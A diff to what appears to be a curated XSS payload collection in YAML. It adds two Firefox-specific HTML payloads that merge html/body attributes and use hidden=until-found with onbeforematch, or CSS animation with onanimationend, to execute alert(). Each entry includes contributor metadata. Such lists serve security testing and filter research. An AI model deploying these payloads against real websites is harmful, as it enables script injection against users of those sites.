@@ -9881,3 +9881,25 @@ payloads:
     tags: ["template", "onsearch", "dom", "modern", "web-components", "curated"]
     browsers: ["Chrome"]
     date_added: "01-01-2026"
+
+  - code: |
+      <html id=xss><html onbeforematch=alert()><html hidden=until-found>
+    description: "Attribute merging of <html>/<body> tags and using hidden=until-found to trigger onbeforematch in firefox"
+    category: "curated"
+    contributor: "Ademar Nowasky Junior"
+    github_username: "nowasky"
+    country: "Brazil"
+    tags: ["onbeforematch", "html", "hidden", "modern", "body", "curated"]
+    browsers: ["Firefox"]
+    date_added: "01-01-2026"    
+
+  - code: |
+      <body style=animation:x><body onanimationend=alert()><style>@keyframes x{
+    description: "Bypass where page can have only one <html> and one <body>"
+    category: "curated"
+    contributor: "Ademar Nowasky Junior"
+    github_username: "nowasky"
+    country: "Brazil"
+    tags: ["body", "html", "onanimationend", "merge", "body", "curated"]
+    browsers: ["Firefox"]
+    date_added: "01-01-2026"    
